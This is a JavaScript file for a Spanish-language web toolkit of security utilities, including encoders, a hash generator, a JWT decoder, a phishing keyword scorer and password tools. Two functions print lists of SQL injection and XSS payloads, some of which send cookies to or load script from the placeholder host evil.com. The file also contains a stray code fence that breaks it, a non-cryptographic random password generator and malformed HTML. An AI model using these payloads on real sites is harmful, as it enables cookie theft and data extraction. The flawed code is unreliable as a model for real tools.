// ============================================
// CYBERNEXUS TOOLS - JavaScript Functions
// ============================================

// Utility: Copy to clipboard
function copyToClipboard(elementId) {
    const element = document.getElementById(elementId);
    element.select();
    document.execCommand('copy');
    alert('Copiado al portapapeles!');
}

// ============================================
// TOOL 1: PASSWORD GENERATOR
// ============================================
document.getElementById('pwd-length')?.addEventListener('input', function () {
    document.getElementById('pwd-length-val').textContent = this.value;
});

function generatePassword() {
    const length = parseInt(document.getElementById('pwd-length').value);
    const useUpper = document.getElementById('pwd-upper').checked;
    const useLower = document.getElementById('pwd-lower').checked;
    const useNumbers = document.getElementById('pwd-numbers').checked;
    const useSymbols = document.getElementById('pwd-symbols').checked;

    let charset = '';
    if (useUpper) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (useLower) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (useNumbers) charset += '0123456789';
    if (useSymbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';

    if (charset === '') {
        alert('Selecciona al menos un tipo de carácter');
        return;
    }

    let password = '';
    for (let i = 0; i < length; i++) {
        password += charset.charAt(Math.floor(Math.random() * charset.length));
    }

    document.getElementById('pwd-output').value = password;
}

// ============================================
// TOOL 2: HASH GENERATOR
// ============================================
async function generateHash() {
    const input = document.getElementById('hash-input').value;
    const type = document.getElementById('hash-type').value;

    if (!input) {
        alert('Ingresa un texto para hashear');
        return;
    }

    const encoder = new TextEncoder();
    const data = encoder.encode(input);

    let hashBuffer;
    if (type === 'sha1') {
        hashBuffer = await crypto.subtle.digest('SHA-1', data);
    } else if (type === 'sha256') {
        hashBuffer = await crypto.subtle.digest('SHA-256', data);
    } else if (type === 'sha512') {
        hashBuffer = await crypto.subtle.digest('SHA-512', data);
    }

    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    document.getElementById('hash-output').value = hashHex;
}

// ============================================
// TOOL 3: BASE64 ENCODER/DECODER
// ============================================
function base64Encode() {
    const input = document.getElementById('base64-input').value;
    if (!input) {
        alert('Ingresa texto para codificar');
        return;
    }
    try {
        const encoded = btoa(unescape(encodeURIComponent(input)));
        document.getElementById('base64-output').value = encoded;
    } catch (e) {
        alert('Error al codificar: ' + e.message);
    }
}

function base64Decode() {
    const input = document.getElementById('base64-input').value;
    if (!input) {
        alert('Ingresa texto para decodificar');
        return;
    }
    try {
        const decoded = decodeURIComponent(escape(atob(input)));
        document.getElementById('base64-output').value = decoded;
    } catch (e) {
        alert('Error al decodificar: ' + e.message);
    }
}

// ============================================
// TOOL 4: URL ENCODER/DECODER
// ============================================
function urlEncode() {
    const input = document.getElementById('url-input').value;
    if (!input) {
        alert('Ingresa una URL para codificar');
        return;
    }
    const encoded = encodeURIComponent(input);
    document.getElementById('url-output').value = encoded;
}

function urlDecode() {
    const input = document.getElementById('url-input').value;
    if (!input) {
        alert('Ingresa una URL para decodificar');
        return;
    }
    try {
        const decoded = decodeURIComponent(input);
        document.getElementById('url-output').value = decoded;
    } catch (e) {
        alert('Error al decodificar: ' + e.message);
    }
}

// ============================================
// TOOL 5: IP LOOKUP
// ============================================
async function lookupIP() {
    const ip = document.getElementById('ip-input').value;
    if (!ip) {
        alert('Ingresa una dirección IP');
        return;
    }

    document.getElementById('ip-output').value = 'Consultando...';

    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();

        if (data.error) {
            document.getElementById('ip-output').value = 'Error: ' + data.reason;
            return;
        }

        const info = `IP: ${data.ip}
País: ${data.country_name} (${data.country_code})
Región: ${data.region}
Ciudad: ${data.city}
Código Postal: ${data.postal}
Latitud: ${data.latitude}
Longitud: ${data.longitude}
ISP: ${data.org}
Timezone: ${data.timezone}`;

        document.getElementById('ip-output').value = info;
    } catch (error) {
        document.getElementById('ip-output').value = 'Error al consultar la IP. Verifica tu conexión.';
    }
}

async function getMyIP() {
    document.getElementById('ip-output').value = 'Obteniendo tu IP...';

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        document.getElementById('ip-input').value = data.ip;
        await lookupIP();
    } catch (error) {
        document.getElementById('ip-output').value = 'Error al obtener tu IP.';
    }
}

// ============================================
// TOOL 6: JWT DECODER
// ============================================
function decodeJWT() {
    const token = document.getElementById('jwt-input').value;
    if (!token) {
        alert('Ingresa un token JWT');
        return;
    }

    try {
        const parts = token.split('.');
        if (parts.length !== 3) {
            throw new Error('Formato JWT inválido');
        }

        const header = JSON.parse(atob(parts[0]));
        const payload = JSON.parse(atob(parts[1]));

        const output = `HEADER:
${JSON.stringify(header, null, 2)}

PAYLOAD:
${JSON.stringify(payload, null, 2)}`;

        document.getElementById('jwt-output').value = output;
    } catch (e) {
        document.getElementById('jwt-output').value = 'Error al decodificar: ' + e.message;
    }
}

// ============================================
// TOOL 7: SQL INJECTION PAYLOADS
// ============================================
function generateSQLi() {
    const type = document.getElementById('sqli-type').value;
    let payloads = '';

    if (type === 'union') {
        payloads = `-- UNION-based SQL Injection Payloads --

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--`;
    } else if (type === 'error') {
        payloads = `-- Error-based SQL Injection Payloads --

' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT user))--
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,database()),1)--
' OR 1=1--
' OR '1'='1
' OR 1=1#
admin'--
admin' #
admin'/*`;
    } else if (type === 'blind') {
        payloads = `-- Blind SQL Injection Payloads --

' AND 1=1--
' AND 1=2--
' AND SUBSTRING(version(),1,1)='5'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT LENGTH(database()))>5--
1' AND '1'='1
1' AND '1'='2`;
    } else if (type === 'time') {
        payloads = `-- Time-based Blind SQL Injection Payloads --

' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5('test'))--
'; WAITFOR DELAY '00:00:05'--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--
1'; IF (1=1) WAITFOR DELAY '00:00:05'--`;
    }

    payloads += '\n\n⚠️ ADVERTENCIA: Estos payloads son solo para fines educativos.';
    payloads += '\nUsar SQL injection en sistemas sin autorización es ILEGAL.';

    document.getElementById('sqli-output').value = payloads;
}

// ============================================
// TOOL 8: XSS PAYLOADS
// ============================================
function generateXSS() {
    const type = document.getElementById('xss-type').value;
    let payloads = '';

    if (type === 'basic') {
        payloads = `-- XSS Básico --

<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<script>alert(window.origin)</script>
<script src="http://evil.com/xss.js"></script>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>`;
    } else if (type === 'img') {
        payloads = `-- XSS con IMG tag --

<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.cookie)>
<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>
<img src="javascript:alert('XSS')">
<img/src="x"/onerror="alert('XSS')">
<img src=1 href=1 onerror="javascript:alert(1)"></img>`;
    } else if (type === 'svg') {
        payloads = `-- XSS con SVG --

<svg onload=alert('XSS')>
<svg><script>alert('XSS')</script></svg>
<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
<svg/onload=alert('XSS')>
<svg><a><animate attributeName=href values=javascript:alert('XSS') />`;
    } else if (type === 'event') {
        payloads = `-- XSS con Event Handlers --

<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<div onmouseover=alert('XSS')>Hover me</div>
<a href="javascript:alert('XSS')">Click</a>`;
    }

    payloads += '\n\n⚠️ ADVERTENCIA: Estos payloads son solo para fines educativos.';
    payloads += '\nUsar XSS en sitios sin autorización es ILEGAL.';

    document.getElementById('xss-output').value = payloads;
}

// ============================================
// TOOL 9: CONVERTER (HEX/BIN/DEC)
// ============================================
function convertNumber() {
    const input = document.getElementById('converter-input').value;
    const from = document.getElementById('converter-from').value;
    let decValue;

    if (!input) {
        alert('Ingresa un número');
        return;
    }

    try {
        if (from === 'dec') {
            decValue = parseInt(input, 10);
        } else if (from === 'hex') {
            decValue = parseInt(input, 16);
        } else if (from === 'bin') {
            decValue = parseInt(input, 2);
        }

        if (isNaN(decValue)) {
            throw new Error('Número inválido');
        }

        const output = `Decimal: ${decValue}
Hexadecimal: 0x${decValue.toString(16).toUpperCase()}
Binario: ${decValue.toString(2)}`;

        document.getElementById('converter-output').value = output;
    } catch (e) {
        document.getElementById('converter-output').value = 'Error: Entrada inválida';
    }
}

// ============================================
// TOOL 10: TEXT DIFF CHECKER
// ============================================
function checkDiff() {
    const text1 = document.getElementById('diff-text1').value;
    const text2 = document.getElementById('diff-text2').value;

    if (text1 === text2) {
        document.getElementById('diff-output').value = 'Los textos son idénticos.';
    } else {
        document.getElementById('diff-output').value = 'Los textos son diferentes.\n\nLongitud Texto 1: ' + text1.length + '\nLongitud Texto 2: ' + text2.length;
    }
}

// ============================================
// TOOL 11: REGEX TESTER
// ============================================
function testRegex() {
    const pattern = document.getElementById('regex-pattern').value;
    const text = document.getElementById('regex-text').value;

    if (!pattern || !text) {
        alert('Ingresa un patrón y texto');
        return;
    }

    try {
        const regex = new RegExp(pattern, 'g');
        const matches = text.match(regex);

        if (matches) {
            document.getElementById('regex-output').value = `Encontradas ${matches.length} coincidencias:\n\n${matches.join('\n')}`;
        } else {
            document.getElementById('regex-output').value = 'No se encontraron coincidencias.';
        }
    } catch (e) {
        document.getElementById('regex-output').value = 'Error en la expresión regular: ' + e.message;
    }
}

// ============================================
// TOOL 12: LOREM IPSUM GENERATOR
// ============================================
function generateLorem() {
    const count = parseInt(document.getElementById('lorem-count').value);
    const lorem = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.";

    let output = '';
    for (let i = 0; i < count; i++) {
        output += lorem + '\n\n';
        ```
    }

    document.getElementById('lorem-output').value = output.trim();
}

document.getElementById('lorem-count')?.addEventListener('input', function () {
    document.getElementById('lorem-count-val').textContent = this.value;
});

// ============================================
// TOOL 13: AI PHISHING ANALYZER
// ============================================
function analyzePhishing() {
    const text = document.getElementById('phish-input').value.toLowerCase();
    const resultDiv = document.getElementById('phish-result');
    
    if (!text) {
        alert('Por favor ingresa el texto del correo.');
        return;
    }

    let score = 0;
    let triggers = [];
    
    // Palabras clave de urgencia (High Risk)
    const urgencyWords = ['urgente', 'inmediato', 'suspendida', 'bloqueada', 'acción requerida', '24 horas', 'cancelación', 'verificar ahora'];
    urgencyWords.forEach(word => {
        if (text.includes(word)) {
            score += 15;
            triggers.push(`Urgencia detectada: "${word}"`);
        }
    });

    // Palabras clave financieras (Medium Risk)
    const financeWords = ['banco', 'factura', 'pago', 'tarjeta de crédito', 'saldo', 'transferencia', 'reembolso', 'paypal'];
    financeWords.forEach(word => {
        if (text.includes(word)) {
            score += 10;
            triggers.push(`Término financiero: "${word}"`);
        }
    });

    // Solicitud de datos (High Risk)
    const dataWords = ['contraseña', 'password', 'pin', 'número de cuenta', 'ssn', 'dni', 'actualizar datos'];
    dataWords.forEach(word => {
        if (text.includes(word)) {
            score += 20;
            triggers.push(`Solicitud de datos sensibles: "${word}"`);
        }
    });

    // Saludos genéricos (Low Risk)
    const genericGreetings = ['estimado cliente', 'estimado usuario', 'hola amigo'];
    genericGreetings.forEach(word => {
        if (text.includes(word)) {
            score += 5;
            triggers.push(`Saludo genérico: "${word}"`);
        }
    });

    // Cap score at 100
    if (score > 100) score = 100;

    // Determine status
    let status = '';
    let color = '';
    let icon = '';

    if (score < 20) {
        status = 'SEGURO';
        color = '#00ff41';
        icon = 'fa-check-circle';
    } else if (score < 60) {
        status = 'SOSPECHOSO';
        color = '#ffbd2e';
        icon = 'fa-exclamation-triangle';
    } else {
        status = 'PELIGROSO (PHISHING)';
        color = '#ff0055';
        icon = 'fa-skull-crossbones';
    }

    resultDiv.style.display = 'block';
    resultDiv.style.border = `1px solid ${ color } `;
    resultDiv.style.background = `rgba(${ parseInt(color.slice(1, 3), 16)
    }, ${ parseInt(color.slice(3, 5), 16) }, ${ parseInt(color.slice(5, 7), 16) }, 0.1)`;
    
    resultDiv.innerHTML = `
        < h4 style = "color: ${color}; margin-bottom: 10px;" > <i class="fas ${icon}"></i> Análisis: ${ status } (${ score } /100)</h4 >
        <p style="margin-bottom: 10px;"><strong>Factores detectados:</strong></p>
        <ul style="list-style: disc; margin-left: 20px; color: #ccc;">
            ${triggers.length > 0 ? triggers.map(t => `<li>${t}</li>`).join('') : '<li>No se detectaron patrones sospechosos obvios.</li>'}
        </ul>
        <p style="margin-top: 10px; font-size: 0.9rem; color: #888;">*Este análisis es heurístico y no garantiza al 100% la seguridad.</p>
    `;
}

// ============================================
// TOOL 14: SMART PASSWORD AI
// ============================================
function analyzePasswordAI() {
    const password = document.getElementById('smart-pwd-input').value;
    const scoreEl = document.getElementById('ai-score');
    const timeEl = document.getElementById('ai-time');
    const barEl = document.getElementById('ai-bar');
    const feedbackEl = document.getElementById('ai-feedback');

    if (!password) {
        scoreEl.textContent = '0/100';
        timeEl.textContent = 'Tiempo: Instantáneo';
        barEl.style.width = '0%';
        feedbackEl.textContent = '';
        return;
    }

    let score = 0;
    let suggestions = [];

    // Length check
    if (password.length > 8) score += 20;
    if (password.length > 12) score += 20;
    if (password.length > 16) score += 10;

    // Character variety
    if (/[A-Z]/.test(password)) score += 10;
    else suggestions.push("Agrega mayúsculas.");
    
    if (/[a-z]/.test(password)) score += 10;
    
    if (/[0-9]/.test(password)) score += 10;
    else suggestions.push("Agrega números.");
    
    if (/[^A-Za-z0-9]/.test(password)) score += 20;
    else suggestions.push("Agrega símbolos (!@#$).");

    // Patterns (Penalties)
    if (/(.)\1{2,}/.test(password)) {
        score -= 10;
        suggestions.push("Evita caracteres repetidos.");
    }
    if (/123|abc|qwerty|password|admin/.test(password.toLowerCase())) {
        score -= 30;
        suggestions.push("Evita secuencias o palabras comunes.");
    }

    // Clamp score
    if (score < 0) score = 0;
    if (score > 100) score = 100;

    // Time estimation (Rough heuristic)
    let time = 'Instantáneo';
    if (score > 40) time = 'Minutos';
    if (score > 60) time = 'Días';
    if (score > 80) time = 'Años';
    if (score > 90) time = 'Siglos';

    // Update UI
    scoreEl.textContent = `${ score }/100`;
    timeEl.textContent = `Tiempo estimado: ${time}`;
    barEl.style.width = `${score}%`;

    let color = '#ff0055'; // Red
    if (score > 40) color = '#ffbd2e'; // Orange
    if (score > 70) color = '#00ff41'; // Green
    barEl.style.background = color;

    feedbackEl.innerHTML = suggestions.length > 0 ?
        `<strong>Sugerencias:</strong> ${suggestions.join(' ')}` :
        '<strong style="color: #00ff41;">¡Excelente contraseña!</strong>';
}
```
